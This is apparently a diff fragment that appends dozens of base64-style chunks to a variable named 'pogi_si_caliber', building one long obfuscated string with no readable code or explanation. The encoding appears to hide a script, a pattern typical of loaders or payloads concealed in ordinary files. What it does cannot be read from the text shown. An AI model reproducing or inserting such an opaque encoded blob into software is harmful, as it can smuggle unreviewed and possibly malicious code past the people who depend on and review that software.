+pogi_si_caliber += "vPxteDwIOeg5OYg8CDn4PAy8LR0I3Pxs3E18uYg8CIiIrYqYOD";
+pogi_si_caliber += "g4ODg4ODwMzN0NeDwteDnoPAy8LR98rOxtD4wP6YqYODg4ODg4";
+pogi_si_caliber += "ODysWLwteDn4OTioPM1teDiJ6DwMvC0dD4wP6YqYODg4ODg4OD";
+pogi_si_caliber += "xs/QxoPKxYvXg5+DwteKg8zW14OInoOEg4SYqYODg4ODg4ODxs";
+pogi_si_caliber += "/QxoPKxYvXg5+DwteDiIONkIqDzNbXg4ieg9HCzceLipipg4OD";
+pogi_si_caliber += "g4ODg4PGz9DGg8zW14OInoPAy8LR0PjA/pipg4ODg4OD3qmDg4";
+pogi_si_caliber += "ODg4PQxtfvys3Gi9GPg8zW14qYqYODg4PeqYODg4PKxYvCz8+K";
+pogi_si_caliber += "g9HG1cbCz+LPz4uKmKmDg96pg4PF1s3A18rMzYPEz8rXwMvw18";
+pogi_si_caliber += "bTi83M1IrYqYODg4PKxYvNzNSDnYPNxtvX5M/K18DLitipg4OD";
+pogi_si_caliber += "g4ODxM/K18DL9s3Xys+DnoPNzNSDiIPAxcSNxM/K18DL98rOxp";
+pogi_si_caliber += "ipg4ODg4ODzcbb1+TPytfAy4Oeg83M1IOIg8DFxI3Ez8rXwMvu";
+pogi_si_caliber += "ys2DiIPuwtfLjdHCzcfMzouKg4mDwMXEjcTPytfAy/XC0Zipg4";
+pogi_si_caliber += "ODg4ODxM/K18DL8czU78rQ14Oeg/j+mKmDg4ODg4PAzM3Q14PW";
+pogi_si_caliber += "0MbHg56D2N6YqYODg4ODg8DMzdDXg8DM1s3Xg56D7sLXy43Oys";
+pogi_si_caliber += "2LwMXEjcTPytfAy/HM1NCPg9HM1NCKmKmDg4ODg4PUy8rPxovE";
+pogi_si_caliber += "z8rXwMvxzNTvytDXjc/GzcTXy4Ofg8DM1s3Xitipg4ODg4ODg4";
+pogi_si_caliber += "PAzM3Q14PRg56Di+7C18uN0cLNx8zOi4qDiYPRzNTQioPfg5OY";
+pogi_si_caliber += "qYODg4ODg4ODysWL1tDGx/jR/oqDwMzN18rN1saYqYODg4ODg4";
+pogi_si_caliber += "OD1tDGx/jR/oOeg5KYqYODg4ODg4ODxM/K18DL8czU78rQ143T";
+pogi_si_caliber += "1tDLi9GKmKmDg4ODg4PeqYODg4PeqYODg4PKxYvNzNSDn4PEz8";
+pogi_si_caliber += "rXwMv2zdfKz4rYqYODg4ODg8TPytfAy8rNxIOeg9fR1saYqYOD";
+pogi_si_caliber += "g4ODg8XM0YvAzM3Q14PRg8zFg8TPytfAy/HM1O/K0NeK2KmDg4";
+pogi_si_caliber += "ODg4ODg8/Kzcbmz9D40f6N0Nfaz8aN19HCzdDFzNHOg56DhNfR";
+pogi_si_caliber += "ws3Qz8LXxvuLhIOIg4uL7sLXy43Rws3HzM6LioOJg5KNlYqDjo";
+pogi_si_caliber += "ONm4qN18zlytvGx4uRioOIg4TGzoqEmKmDg4ODg4ODg9DG1+/K";
+pogi_si_caliber += "zcaL0Y+DwMzR0dbT1+/KzcaLxNHKx/jR/o3JzMrNi4SEioqKmK";
+pogi_si_caliber += "mDg4ODg4PeqYODg4Pexs/QxoPKxYvEz8rXwMvKzcSK2KmDg4OD";
+pogi_si_caliber += "g4PEz8rXwMvKzcSDnoPFws/Qxpipg4ODg4ODxczRi8DMzdDXg9";
+pogi_si_caliber += "GDzMWDxM/K18DL8czU78rQ14qD0cbQ18zRxvHM1IvRipipg4OD";
+pogi_si_caliber += "g96pg4PeqYODxdbNwNfKzM2D0MDCzfDXxtOLzczUitipg4ODg8";
+pogi_si_caliber += "rFi4LAxcSN0MDCzYqD0cbX1tHNmKmDg4ODysWLgtDAws3iwNfK";
+pogi_si_caliber += "1caK2KmDg4ODg4PKxYvNzNSDnYPNxtvX8MDCzYrYqYODg4ODg4";
+pogi_si_caliber += "OD0MDCzeLA18rVxoOeg9fR1saYqYODg4ODg4OD0MDCzfDXwtHX";
+pogi_si_caliber += "xsfi14Oeg83M1Jipg4ODg4OD3qmDg4ODg4PRxtfW0c2YqYODg4";
+pogi_si_caliber += "PeqYODg4PAzM3Q14PTg56Di83M1IOOg9DAws3w18LR18bH4teK";
+pogi_si_caliber += "g4yDwMXEjdDAws3n1tHC18rMzZipg4ODg8rFi9ODnYOSitipg4";
+pogi_si_caliber += "ODg4OD0MDCzeLA18rVxoOeg8XCz9DGmKmDg4ODg4PNxtvX8MDC";
+pogi_si_caliber += "zYOeg83M1IOIg8DFxI3QwMLN88bRyszHg4iD7sLXy43Rws3HzM";
+pogi_si_caliber += "6LioOJg8DFxI3QwMLN88bRyszH9cLRmKmDg4ODg4PAz8bC0evM";
+pogi_si_caliber += "14uKmKmDg4ODg4PRxtfW0c2YqYODg4PeqYODg4PAzM3Q14PA1t";
+pogi_si_caliber += "GDnoOLwMXEjdDAws3204Ocg5KDjoPTg5mD04qDiYOL0czU0IOI";
+pogi_si_caliber += "g5GDiYPAxcSN0MDCzfTKx9fLioOOg8DFxI3QwMLN9MrH18uYqY";
+pogi_si_caliber += "ODg4PFzNGLz8bXg9GDnoOTmIPRg5+D0czU0JiD0YiIitipg4OD";
+pogi_si_caliber += "g4ODwMzN0NeDzM2DnoPuwtfLjcLB0IvRg46DwNbRioOfnoPAxc";
+pogi_si_caliber += "SN0MDCzfTKx9fLmKmDg4ODg4PKxYvMzYOenp6Dy8zX8czU0PjR";
+pogi_si_caliber += "/oqDwMzN18rN1saYqYODg4ODg8vM1/HM1ND40f6DnoPMzZipg4";
+pogi_si_caliber += "ODg4ODz8rNxubP0PjR/o3Az8LQ0O/K0NeN18zExM/Gi4TLzNeE";
+pogi_si_caliber += "j4PMzYqYqYODg4PeqYOD3qmDg8XWzcDXyszNg8/MzNOLzczUit";
+pogi_si_caliber += "ipg4ODg9HCxYOeg9HG0tbG0NfizcrOwtfKzM3l0cLOxovPzMzT";
+pogi_si_caliber += "ipipg4ODg8rFi4LQ18LR18bHioPRxtfW0c2YqYODg4PKxYvNzN";
+pogi_si_caliber += "SDjoPPwtDX5dHCzsaDn4PAxcSN18vRzNfXz8aKg9HG19bRzZip";
+pogi_si_caliber += "g4ODg8/C0Nfl0cLOxoOeg83M1Jipg4ODg8rFi4LRxtXGws/nzM";
+pogi_si_caliber += "3Gitipg4ODg4OD0cbVxsLP8NfG04vNzNSKmKmDg4ODg4PRxtfW";
+pogi_si_caliber += "0c2YqYODg4PeqYODg4PEz8rXwMvw18bTi83M1IqYqYODg4PQwM";
+pogi_si_caliber += "LN8NfG04vNzNSKmKmDg96pg4PF1s3A18rMzYPQ18LR14vNzNSK";
+pogi_si_caliber += "2KmDg4OD0NfC0dfGx+LXg56DzczUg56eg83Wz8+DnIPTxtHFzN";
+pogi_si_caliber += "HOws3Axo3NzNSLioOZg83M1Jipg4ODg8/C0Nfl0cLOxoOeg5OY";
+pogi_si_caliber += "qYODg4PQ18LR18bHg56D19HWxpipg4ODg9HG1cbCz+fMzcaDno";
+pogi_si_caliber += "PFws/Qxpipg4ODg8TPytfAy8rNxIOeg8XCz9DGmKmDg4ODxM/K";
+pogi_si_caliber += "18DL8czU78rQ14Oeg/j+mKmDg4ODxM/K18DL9s3Xys+DnoOTmK";
+pogi_si_caliber += "mDg4ODx8zNxvHM1NCNxcrPz4vFws/QxoqYqYODg4PLzNfxzNTQ";
+pogi_si_caliber += "jcXKz8+LxcLP0MaKmKmDg4ODxczRi8/G14PRg56Dk5iD0YOfg9";
+pogi_si_caliber += "HM1NCYg9GIiIrYqYODg4ODg8/Kzcb3xtvX+NH+g56DhISYqYOD";
+pogi_si_caliber += "g4ODg8/Kzcbmz9D40f6N18bb1+DMzdfGzdeDnoOEg4SN0cbTxs";
+pogi_si_caliber += "LXi8TRysf40f6Nz8bNxNfLipipg4ODg4ODz8rNxubP0PjR/o3Q";
+pogi_si_caliber += "19rPxo3X0cLN0MXM0c6DnoOEhJipg4ODg4ODz8rNxubP0PjR/o";
+pogi_si_caliber += "3Az8LQ0O/K0NeN0cbOzNXGi4TLzNeEipipg4ODg96pg4ODg83G";
+pogi_si_caliber += "29fwwMLNg56D0NfC0dfGx+LXg4iDkpOTk4OJg4vAxcSN0NTGxt";
+pogi_si_caliber += "ODiIPAxcSNycrX18bRioOIg8DFxI3QwMLN58bPwtqYqYODg4PN";
+pogi_si_caliber += "xtvX5M/K18DLg56D0NfC0dfGx+LXg4iDkpOTk4OJg4vAxcSN0N";
+pogi_si_caliber += "TGxtODiIPAxcSNycrX18bRioOIg5GWk5OYqYODg4PKxYuC0cLF";
+pogi_si_caliber += "ioPRwsWDnoPRxtLWxtDX4s3KzsLXyszN5dHCzsaLz8zM04qYqY";
+pogi_si_caliber += "OD3qmDg8XWzcDXyszNg8fG0NfRzNqLitipg4ODg8rFi9HCxYqD";
+pogi_si_caliber += "wMLNwMbP4s3KzsLXyszN5dHCzsaL0cLFipipg4ODg9HCxYOeg5";
+pogi_si_caliber += "OYqYODg4PQ18LR18bHg56DxcLP0MaYqYODg4PGz43Kzc3G0ev3";
+pogi_si_caliber += "7u+DnoOEhJipg4PeqamDg9HG19bRzYPYqYODg4PXxtvXj6mDg4";
+pogi_si_caliber += "OD0NfC0dePqYODg4PHxtDX0czaj6mDg4OD0cbVxsLP4s/Pj6mD";
+pogi_si_caliber += "g4ODxMbXg9DXwtHXxseLitiD0cbX1tHNg9DXwtHXxseYg96PqY";
+pogi_si_caliber += "ODg4PExteDx8zNxouK2IPRxtfW0c2D0cbVxsLP58zNxpiD3o+p";
+pogi_si_caliber += "g4ODg8TG14PQ18LR18bH4teLitiD0cbX1tHNg9DXwtHXxsfi15";
+pogi_si_caliber += "iD3o+pg4ODg8TG14PPys3G4MzWzdeLitiD0cbX1tHNg9HM1NCY";
+pogi_si_caliber += "g96PqYODg4PExteDy8zX4MzWzdeLitiD0cbX1tHNg8vM1/HM1N";
+pogi_si_caliber += "CNxcrP18bRi+HMzM/Gws2Kjc/GzcTXy5iD3o+pg4ODg8TG14PE";
+pogi_si_caliber += "z8rXwMvxzNTQi4rYg9HG19bRzYPEz8rXwMvxzNTvytDXjdDPys";
+pogi_si_caliber += "DGi4qYg96PqYODg4PExteDxM/K18DLys3Ei4rYg9HG19bRzYPE";
+pogi_si_caliber += "z8rXwMvKzcSYg96PqYODg4PExteDwMzP0IuK2IPRxtfW0c2DwM";
+pogi_si_caliber += "zP0JiD3o+pg4PemKneqanF1s3A18rMzYPQxtfi0deLxs+Pg9fG";
+pogi_si_caliber += "29ePg8zT19CK2KmDg8DMzdDXg9PRxtWDnoPC0dfmzcTKzcbQjc";
+pogi_si_caliber += "TG14vGz4qYqYODysWL09HG1YOFhYPT0cbVjdfG29eDnp6eg9fG";
+pogi_si_caliber += "29eKg9HG19bRzYPT0cbVmKmDg8DMzdDXg9TC0PDXwtHXxseDno";
+pogi_si_caliber += "PT0cbVg4WFg9PRxtWN0NfC0dfGx5ipg4PKxYvT0cbVioPT0cbV";
+pogi_si_caliber += "jcfG0NfRzNqLipipg4PKxYvRxsfWwMbuzNfKzM2K2KmDg4ODxs";
+pogi_si_caliber += "+N18bb1+DMzdfGzdeDnoPXxtvXmKmDg4ODwMzN0NeD0NfWwYOe";
+pogi_si_caliber += "g9iD18bb14+D0NfC0deLitjej4PHxtDX0czai4rYg8bPjdfG29";
+pogi_si_caliber += "fgzM3Xxs3Xg56DhISYg96Pg9DXwtHXxseZg9fR1saPg8fMzcaZ";
+pogi_si_caliber += "g9fR1saD3pipg4ODg8LR1+bNxMrNxtCN0MbXi8bPj4PQ19bBip";
+pogi_si_caliber += "ipg4ODg9HG19bRzYPQ19bBmKmDg96pg4PAzM3Q14PGzcTKzcaD";
+pogi_si_caliber += "noPA0cbC18bi0dfmzcTKzcaLxs+Pg9fG29ePg8zT19CKmKmDg8";
+pogi_si_caliber += "LR1+bNxMrNxtCN0MbXi8bPj4PGzcTKzcaKmKmDg8rFi9TC0PDX";
+pogi_si_caliber += "wtHXxseKg8bNxMrNxo3Q18LR14uKmKmDg9HG19bRzYPGzcTKzc";
+pogi_si_caliber += "aYqd6pxdbNwNfKzM2D0NfC0dfi0dfmzcTKzcaLxs+K2KmDg8DM";
+pogi_si_caliber += "zdDXg8bNxMrNxoOeg8LR1+bNxMrNxtCNxMbXi8bPipipg4PKxY";
+pogi_si_caliber += "vGzcTKzcaDhYWD19rTxszFg8bNxMrNxo3Q18LR14Oenp6DhMXW";
+pogi_si_caliber += "zcDXyszNhIqDxs3Eys3GjdDXwtHXi4qYqd6pqcXWzcDXyszNg8";
+pogi_si_caliber += "/C2szW1+LR14uK2KmDg8DMzdDXg9fG29eDnoPC0dfwzNbRwMaL";
+pogi_si_caliber += "ipipg4PFytfi0deLxs3XxtHi0dePg9fG29ePg5eTj4ONm5uPg4";
+pogi_si_caliber += "2VkYqYqYODxcrX4tHXi8HCzc3G0ebPj4PXxtvXj4OSm4+DjZqP";
+pogi_si_caliber += "g42XkYqYqYOD0MbX4tHXi8bN18bR4tHXj4PXxtvXj4PYqYODg4";
+pogi_si_caliber += "PM0cfG0ZmD4vH3/Ozx5+bxjdPRys3Xj4PQ1MbG05mDko2Qlo+D";
+pogi_si_caliber += "ycrX18bRmYONko+pg4ODg8TPytfAy+7KzZmDl5OTk4+DxM/K18";
+pogi_si_caliber += "DL9cLRmYORl5OTj4PEz8rXwMvxzNTQmYORj4PEz8rXwMv3ys7G";
+pogi_si_caliber += "mYOSkZOPqYODg4PQwMLNmYPFws/Qxo+pg4Peipipg4PQxtfi0d";
+pogi_si_caliber += "eLwcLNzcbR5s+Pg9fG29ePg9ipg4ODg8zRx8bRmYPi8ff87PHn";
+pogi_si_caliber += "5vGNwczX18zO9tPnysLEzM3Cz4+D0NTGxtOZg5KNk5aPg8nK19";
+pogi_si_caliber += "fG0ZmDjZePqYODg4PEz8rXwMvuys2Zg5GTk5OPg8TPytfAy/XC";
+pogi_si_caliber += "0ZmDk4+DxM/K18DL8czU0JmDkI+DxM/K18DL58bPwtqZg5STk4";
+pogi_si_caliber += "+pg4ODg9DAws3zxtHKzMeZg5qTk5OPg9DAws3zxtHKzMf1wtGZ";
+pogi_si_caliber += "g5CWk5OPg9DAws30ysfXy5mDkY+pg4Peipip3qnPwtrM1tfi0d";
+pogi_si_caliber += "eLipipwsfH5tXGzdfvytDXxs3G0YuE0cbQytnGhI+Dz8LazNbX";
+pogi_si_caliber += "4tHXipipqc/G14PBxOLR1/DXwtHXxseDnoPFws/QxpipxdbNwN";
+pogi_si_caliber += "fKzM2D0NfC0dfhwsDIxNHM1s3H4tHXi4rYqYODysWLwcTi0dfw";
+pogi_si_caliber += "18LR18bHg9/fg9HGx9bAxu7M18rMzYqD0cbX1tHNmKmDg8HE4t";
+pogi_si_caliber += "HX8NfC0dfGx4Oeg9fR1saYqYODwMzN0NeDwtHX0IOeg/iNjY3H";
+pogi_si_caliber += "zMDWzsbN143S1sbR2vDGz8bA18zR4s/Pi4SNwcTC0deEiv6N0M";
+pogi_si_caliber += "/KwMaLk4+Dl4qYqYODwtHX0I3FzNHmwsDLi4vGz4+DyoqDnp2D";
+pogi_si_caliber += "2KmDg4ODwMzN0NeDxs3Eys3Gg56DwNHGwtfG4tHX5s3Eys3Gi8";
+pogi_si_caliber += "bPj4Pg7O3l6uSNwcTi0MDKyo+D2KmDg4ODg4PM0cfG0ZmDyoOG";
+pogi_si_caliber += "g5GDnIPi8ff87PHn5vGNwczX18zO9tPnysLEzM3Cz4OZg+Lx9/";
+pogi_si_caliber += "zs8efm8Y3F0czO4MbN19HGj6mDg4ODg4PQ1MbG05mDko2bg4iD";
+pogi_si_caliber += "7sLXy43Rws3HzM6LioOJg42Uj4PJytfXxtGZg42bj6mDg4ODg4";
+pogi_si_caliber += "PEz8rXwMvuys2Zg5eRk5ODiIPuwtfLjdHCzcfMzouKg4mDkZWT";
+pogi_si_caliber += "k4+DxM/K18DL9cLRmYOXm5OTj4PEz8rXwMvxzNTQmYORj6mDg4";
+pogi_si_caliber += "ODg4PQwMLN59bRwtfKzM2Zg5CTk5OPg9DAws3zxtHKzMeZg5qT";
+pogi_si_caliber += "k5ODiIPuwtfLjdHCzcfMzouKg4mDlpOTk4+D0MDCzfTKx9fLmY";
+pogi_si_caliber += "ORj6mDg4ODg4PQwMLNmYPFws/Qxo+pg4ODg4OD18vRzNfXz8aZ";
+pogi_si_caliber += "g5aTj6mDg4OD3oqYqYODg4PGzcTKzcaN0NfC0deLipipg4Peip";
+pogi_si_caliber += "ip3qmpwMzN0NeD8IOeg9jemKnPxteDy8zVxtHqx4Oeg83Wz8+Y";
+pogi_si_caliber += "qcDMzdDXg9DXwtfW0O/CwcbP0IOeg9iDzM3Pys3GmYTMzc/Kzc";
+pogi_si_caliber += "aEj4PKx8/GmYTKx8/GhI+Dx83HmYTHzIPNzNeDx8rQ19bRwYSP";
+pogi_si_caliber += "g8zFxc/KzcaZhMzFxc/KzcaEg96YqcDMzdDXg8LA18rVytfa78";
+pogi_si_caliber += "LBxs/Qg56D+ITTz8Lays3Eg4SPg4TQ19HGws7KzcSDhI+DhM/K";
+pogi_si_caliber += "0NfGzcrNxIPXzIOEj4OE1MLXwMvKzcSDhI+DhISPg4TAzM7Txt";
+pogi_si_caliber += "fKzcSDys2DhP6YqanF1s3A18rMzYPHxtDA0crBxuLA18rVytfa";
+pogi_si_caliber += "i8fC18KPg9DXwtfW0IrYqYODysWLgsfC18KKg9HG19bRzYPQ18";
+pogi_si_caliber += "LX1tDvwsHGz9D40NfC19bQ/oPf34PQ18LX1tCYqYODwMzN0NeD";
+pogi_si_caliber += "wNbQ18zOg56Di8fC18KNwsDXytXK18rG0IPf34P4/oqNxcrNx4";
+pogi_si_caliber += "vCg56dg8KN19rTxoOenp6Dl4qYqYODysWLwNbQ18zOg4WFg8DW";
+pogi_si_caliber += "0NfMzo3Q18LXxoqD0cbX1tHNg8DW0NfMzo3Q18LXxpipg4PAzM";
+pogi_si_caliber += "3Q14PQ08zXysXag56DwoOenYOM0NPM18rF2ozKjdfG0NeLwo3N";
+pogi_si_caliber += "ws7Gg9/fg4SEioPf34OM/dDTzNfKxdqZjMqN18bQ14vCjcrHg9";
+pogi_si_caliber += "/fg4SEipipg4PAzM3Q14PCwNeDnoOLx8LXwo3CwNfK1crXysbQ";
+pogi_si_caliber += "g9/fg/j+io3Fys3Hi8KDnp2Dwo3X2tPGg4KenoOXg4WFg4LQ08";
+pogi_si_caliber += "zXysXai8KKipipg4PKxYvCwNeKg9HG19bRzYOLwsDXytXK19rv";
+pogi_si_caliber += "wsHGz9D4wsDXjdfa08b+g9/fg4SEioOIg8LA143Nws7GmKmDg9";
+pogi_si_caliber += "HG19bRzYPQ18LX1tDvwsHGz9D40NfC19bQ/oPf34PQ18LX1tCY";
+pogi_si_caliber += "qd6pqcDMzdDXg/D3g56D+ITMzc/KzcaEj4OEysfPxoSPg4THzc";
+pogi_si_caliber += "eEj4OEzMXFz8rNxoT+mKnF1s3A18rMzYPQxtfw14vGz4+D0NeK";
+pogi_si_caliber += "2IPw943FzNHmwsDLi9CDnp2Dxs+NwM/C0NDvytDXjdfMxMTPxo";
+pogi_si_caliber += "vQj4PQg56enoPQ14qKmIPeqcXWzcDXyszNg9DG1+fGwMyLwczb";
+pogi_si_caliber += "j4PH0IrYqYODz8bXg8eDnoPBzNuN0tbG0drwxs/GwNfM0YuEjc";
+pogi_si_caliber += "eEipipg4PKxYvH0IrYqYODg4PKxYuCx4rYqYODg4ODg8eDnoPH";
+pogi_si_caliber += "zMDWzsbN143A0cbC18bmz8bOxs3Xi4TKzsSEipipg4ODg4ODx4";
+pogi_si_caliber += "3Az8LQ0O3CzsaDnoOEx4SYqYODg4ODg8eNws/Xg56DhISYqYOD";
+pogi_si_caliber += "g4ODg8HM243KzdDG0dfhxsXM0caLx4+DwczbjdLWxtHa8MbPxs";
+pogi_si_caliber += "DXzNGLhI3QhIqKmKmDg4OD3qmDg4ODysWLx43Extfi19fRysHW";
+pogi_si_caliber += "18aLhNDRwISKg4KenoPH0IqDx43Q0cCDnoPH0Jipg4Pexs/Qxo";
+pogi_si_caliber += "PKxYvHioPHjdHGzszVxouKmKneqanF1s3A18rMzYPRxs3HxtGL";
+pogi_si_caliber += "yseK2KmDg8DMzdDXg9ODnoPw+MrH/o+D1oOeg9ODhYWD043Hyt";
+pogi_si_caliber += "DAzNHH/NbQxtGPg9DXg56D04Ocg4vTjcfK0MDM0cf80NfC19bQ";
+pogi_si_caliber += "g9/fg4TMxcXPys3GhIqDmYOEzMXFz8rNxoSYqYODwMzN0NeDwt";
+pogi_si_caliber += "WDnoPC1cLXwtH20c+L1o+DyseKj4PH0IOeg8fGwMz20c+L1oqP";
+pogi_si_caliber += "g83Og56D1oOcg4vWjcfK0NPPwtr8zcLOxoPf34PWjcTPzMHCz/";
+pogi_si_caliber += "zNws7Gg9/fg9aN1tDG0c3CzsaKg5mDhISYqYODx8zA1s7GzdeN";
+pogi_si_caliber += "0tbG0drwxs/GwNfM0eLPz4uEjc74x8LXwo7Kx56BhIOIg8rHg4";
+pogi_si_caliber += "iDhIH+hIqNxczR5sLAy4vGz4OenYPYqYODg4PAzM3Q14PBzNuD";
+pogi_si_caliber += "noPGz43S1sbR2vDGz8bA18zRi4SNwtWEio+DwoOeg8HM243S1s";
+pogi_si_caliber += "bR2vDGz8bA18zRi4SNwoSKmKmDg4OD0MbX8NeLwczbj4PQ14qY";
+pogi_si_caliber += "qYODg4PKxYvCjcTG1+LX19HKwdbXxouE0NHAhIqDgp6eg8LVio";
+pogi_si_caliber += "PCjdDRwIOeg8LVmKmDg4OD0MbX58bAzIvBzNuPg8fQipipg4OD";
+pogi_si_caliber += "g8rFi83OioPGz43S1sbR2vDGz8bA18zRi4SNzc6Eio3XxtvX4M";
+pogi_si_caliber += "zN18bN14Oeg83OjdfM78zUxtHgwtDGi4qYqYOD3oqYqYODysWL";
+pogi_si_caliber += "y8zVxtHqx4Oenp6DyseDhYWD4frq5/jKx/6Kg8XKz8/rzNXG0Y";
+pogi_si_caliber += "vh+urn+MrH/oqYqYODysWLzNPGze7GzsHG0YOFhYPM08bN7sbO";
+pogi_si_caliber += "wcbRjcfK0MDM0cfqx4Oenp6DyseKg8XKz8/z0czFys/Gi8zTxs";
+pogi_si_caliber += "3uxs7BxtGKmKneqanF1s3A18rMzYPQ18LR1/PRxtDGzcDGi4rY";
+pogi_si_caliber += "qYOD89HMzsrQxo3Cz8+L4u/vjc7C04vKx4OenamDg4ODxcbXwM";
+pogi_si_caliber += "uLhMvX19PQmYyMwtPKjc/CzdrC0ceN0cbQ14zVkozW0MbR0IyE";
+pogi_si_caliber += "g4iDyseKqYODg4ODg43Xy8bNi9GDnp2D0Y3J0MzNi4qKqYODg4";
+pogi_si_caliber += "ODg43Xy8bNi8mDnp2D2IPKxYvJjdDWwMDG0NCK2IPw+MrH/oOe";
+pogi_si_caliber += "g8mNx8LXwpiD0cbNx8bRi8rHipiD3oPeiqmDg4ODg4ONwMLXwM";
+pogi_si_caliber += "uLi4qDnp2D2N6KqYODioqN18vGzYvQzMDIxteKmKmpg4PF1s3A";
+pogi_si_caliber += "18rMzYPQzMDIxteLitipg4ODg8/G14PUj4PLwZipg4ODg9fR2t";
+pogi_si_caliber += "iD1IOeg83G1IP0xsHwzMDIxteLhNTQ0JmMjMLTyo3Pws3awtHH";
+pogi_si_caliber += "jdHG0NeM0MzAyMbXhIqYg97AwtfAy4vGitiD0cbX1tHNmIPeqY";
+pogi_si_caliber += "ODg4PUjczNzsbQ0MLExoOeg86Dnp2D2KmDg4ODg4PAzM3Q14PJ";
+pogi_si_caliber += "g56D6fDs7Y3TwtHQxovOjcfC18KKmKmDg4ODg4PKxYvJjczTg5";
+pogi_si_caliber += "6enoOSitipg4ODg4ODg4PUjdDGzceL6fDs7Y3Q19HKzcTKxdqL";
+pogi_si_caliber += "2IPM05mDkY+Dx5mD2IPQ1sHQwNHKwcb818z8ysfQmYPi7++D3o";
+pogi_si_caliber += "PeioqYqYODg4ODg4ODy8GDnoPQxtfqzdfG0dXCz4uLioOenYPY";
+pogi_si_caliber += "g8rFi9SN0cbCx9rw18LXxoOenp6DkoqD1I3Qxs3Hi4TYgczTgZ";
+pogi_si_caliber += "mQ3oSKmIPej4PJjceNy8bC0dfBxsLX/MrN18bR1cLPipipg4OD";
+pogi_si_caliber += "g4OD3sbP0MaDysWLyY3M04Oenp6Dk4OFhYPJjdeDnp6eg4Tq7e";
+pogi_si_caliber += "r3/PD34vfmhIrYqYODg4ODg4ODxczRi8DMzdDXg8jG2oPKzYPJ";
+pogi_si_caliber += "jceKg8rFi8mNx/jIxtr+g4WFg8mNx/jIxtr+jcfK0MDM0cf81t";
+pogi_si_caliber += "DG0YrYg/D4yMba/oOeg8mNx/jIxtr+mIPRxs3HxtGLyMbaipiD";
+pogi_si_caliber += "3qmDg4ODg4Pexs/QxoPKxYvJjczTg56enoOTg4WFg8mN14Oenp";
+pogi_si_caliber += "6DhPPx5vDm7eDm/Pbz5+L35oSDhYWDyY3Hg4WFg8mNx43HytDA";
+pogi_si_caliber += "zNHH/NbQxtGK2KmDg4ODg4ODg/D4yY3HjcfK0MDM0cf81tDG0Y";
+pogi_si_caliber += "3Kx/6DnoPJjceYqYODg4ODg4OD0cbNx8bRi8mNx43HytDAzNHH";
+pogi_si_caliber += "/NbQxtGNyseKmKmDg4ODg4PeqYODg4PemKmDg4OD1I3MzcDPzN";
+pogi_si_caliber += "DGg56Di4qDnp2D2IPAz8bC0erN18bR1cLPi8vBipiD0MbX98rO";
+pogi_si_caliber += "xszW14vQzMDIxtePg5aTk5OKmIPemKmDg96p3qmpwMzN0NeDy8";
+pogi_si_caliber += "zVxtHgwtHHg56Dx8zA1s7GzdeNxMbX5s/GzsbN1+Ha6seLhMvM";
+pogi_si_caliber += "1cbR4MLRx4SKmKnAzM3Q14PLzNXG0eDC0cfhws3NxtGDnoPHzM";
+pogi_si_caliber += "DWzsbN143Extfmz8bOxs3X4drqx4uEy8zVxtHgwtHH4cLNzcbR";
+pogi_si_caliber += "hIqYqc/G14PLzNXG0eHXzYOeg83Wz8+YqanF1s3A18rMzYPFys";
+pogi_si_caliber += "/P68zVxtGLzsbOwcbRitipg4PAzM3Q14PKx4Oeg87GzsHG0Y3H";
+pogi_si_caliber += "ytDAzNHH6sePg9ODnoPw+MrH/o+D1oOeg9ODhYWD043HytDAzN";
+pogi_si_caliber += "HH/NbQxtGPg9DXg56D04Ocg4vTjcfK0MDM0cf80NfC19bQg9/f";
+pogi_si_caliber += "g4TMxcXPys3GhIqDmYOEzMXFz8rNxoSYqYODwMzN0NeDwtWDno";
+pogi_si_caliber += "PC1cLXwtH20c+L1o+DyseKmKmDg8DMzdDXg8LV5s+DnoPHzMDW";
+pogi_si_caliber += "zsbN143Extfmz8bOxs3X4drqx4uEy8zVxtHgwtHH4tXC18LRhI";
+pogi_si_caliber += "qYqYODysWLwtXmz43Extfi19fRysHW18aLhNDRwISKg4KenoPC";
+pogi_si_caliber += "1YqDwtXmz43Q0cCDnoPC1Zipg4PAzM3Q14PBzNuDnoPHzMDWzs";
+pogi_si_caliber += "bN143Extfmz8bOxs3X4drqx4uEy8zVxtHgwtHH4tXC18LR9NHC";
+pogi_si_caliber += "04SKmKmDg9DG1/DXi8HM24+D0NeKmKmDg9DG1+fGwMyLwczbj4";
+pogi_si_caliber += "PHxsDM9tHPi9aKipipg4PHzMDWzsbN143Extfmz8bOxs3X4drq";
+pogi_si_caliber += "x4uEy8zVxtHgwtHH7cLOxoSKjdfG29fgzM3Xxs3Xg56D1oOcg4";
+pogi_si_caliber += "vWjcfK0NPPwtr8zcLOxoPf34PWjcTPzMHCz/zNws7Gg9/fg9aN";
+pogi_si_caliber += "1tDG0c3CzsaKg5mDzsbOwcbRjc3CzsaYqYODx8zA1s7GzdeNxM";
+pogi_si_caliber += "bX5s/GzsbN1+Ha6seLhMvM1cbR4MLRx+vCzcfPxoSKjdfG29fg";
+pogi_si_caliber += "zM3Xxs3Xg56D1oOcg4TjhIOIg9aN1tDG0c3CzsaDmYOE44SDiI";
+pogi_si_caliber += "POxs7BxtGNzcLOxpipg4PAzM3Q14PQ5s+DnoPHzMDWzsbN143E";
+pogi_si_caliber += "xtfmz8bOxs3X4drqx4uEy8zVxtHgwtHH8NfC19bQhIqYqYOD0M";
+pogi_si_caliber += "bX8NeL0ObPj4PQ14qYqYOD0ObPjdLWxtHa8MbPxsDXzNGLhNDT";
+pogi_si_caliber += "ws2Eio3XxtvX4MzN18bN14Oeg9DXwtfW0O/CwcbP0PjQ1/6D39";
+pogi_si_caliber += "+D0NeYqYODwMzN0NeDwsDX98bb14Oeg9ODnIPHxtDA0crBxuLA";
+pogi_si_caliber += "18rVytfai9OPg9DXioOZg4vQ18LX1tDvwsHGz9D40Nf+g9/fg9";
+pogi_si_caliber += "DXipipg4PHzMDWzsbN143Extfmz8bOxs3X4drqx4uEy8zVxtHg";
+pogi_si_caliber += "wtHH4sDXhIqN18bb1+DMzdfGzdeDnoPCwNf3xtvXg56enoOL0N";
+pogi_si_caliber += "fC19bQ78LBxs/Q+NDX/oPf34PQ14qDnIOE/9aRk5KXhIOZg8LA";
+pogi_si_caliber += "1/fG29eYqamDg8vM1cbR4MLRx+HCzc3G0Y3Q19rPxo3BwsDIxN";
+pogi_si_caliber += "HM1s3H6s7CxMaDnoOEhJipg4PLzNXG0eDC0cfhws3NxtGN0Nfa";
+pogi_si_caliber += "z8aNwcLAyMTRzNbNx+DMz8zRg56DhISYqYODwMzN0NeDzMiDno";
